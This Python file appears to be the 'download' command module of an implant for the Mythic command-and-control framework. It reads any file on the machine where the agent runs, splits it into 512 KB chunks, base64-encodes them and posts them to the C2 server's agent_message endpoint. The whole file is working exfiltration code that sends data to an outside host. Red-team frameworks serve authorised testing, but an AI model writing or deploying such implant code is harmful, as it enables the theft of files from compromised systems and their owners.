import os
import math
import json
import base64
import agent  # same process — SESSION and BASE_URL available after agent.py initializes

CHUNK_SIZE = 512 * 1024  # 512 KB


def _post_raw(callback_id, body):
    encoded = base64.b64encode((callback_id + json.dumps(body)).encode())
    r = agent.SESSION.post(f"{agent.BASE_URL}/agent_message", data=encoded, timeout=30)
    return json.loads(base64.b64decode(r.content)[36:])


def execute(params, task_id, callback_id):
    try:
        parsed = json.loads(params)
        path = parsed.get("path", "").strip()
        dest = parsed.get("dest", "").strip()
    except Exception:
        path = params.strip()
        dest = ""

    # dest controls the filename label in Mythic's Files tab — no target-side copy
    full_path = dest if dest else path

    if not path:
        agent.post_response(callback_id, task_id, "download: no path provided")
        return None
    if not os.path.isfile(path):
        agent.post_response(callback_id, task_id, f"download: file not found: {path}")
        return None

    try:
        total_chunks = max(1, math.ceil(os.path.getsize(path) / CHUNK_SIZE))
        with open(path, "rb") as fh:
            # Chunk 1 — no file_id yet; Mythic allocates a file entry and returns one
            chunk = fh.read(CHUNK_SIZE)
            resp = _post_raw(callback_id, {
                "action": "post_response",
                "uuid": callback_id,
                "responses": [{"task_id": task_id, "download": {
                    "total_chunks": total_chunks,
                    "chunk_num":    1,
                    "chunk_data":   base64.b64encode(chunk).decode(),
                    "full_path":    full_path,
                    "is_screenshot": False,
                }}],
            })
            file_id = resp.get("responses", [{}])[0].get("file_id", "")
            if not file_id:
                agent.post_response(callback_id, task_id, "download: Mythic did not return a file_id")
                return None

            # Chunks 2..N
            for chunk_num in range(2, total_chunks + 1):
                chunk = fh.read(CHUNK_SIZE)
                is_last = (chunk_num == total_chunks)
                entry = {
                    "task_id": task_id,
                    "download": {
                        "file_id":    file_id,
                        "chunk_num":  chunk_num,
                        "chunk_data": base64.b64encode(chunk).decode(),
                    },
                }
                if is_last:
                    entry["completed"] = True
                    entry["status"] = "completed"
                _post_raw(callback_id, {
                    "action": "post_response",
                    "uuid": callback_id,
                    "responses": [entry],
                })

            # Single-chunk file: chunk 1 has no completed flag per the wire format,
            # so send a follow-up empty chunk to close the task
            if total_chunks == 1:
                _post_raw(callback_id, {
                    "action": "post_response",
                    "uuid": callback_id,
                    "responses": [{
                        "task_id": task_id,
                        "download": {"file_id": file_id, "chunk_num": 1, "chunk_data": ""},
                        "completed": True,
                        "status": "completed",
                    }],
                })

    except Exception as e:
        agent.post_response(callback_id, task_id, f"download error: {str(e)}")

    return None  # always — this command manages all its own posts
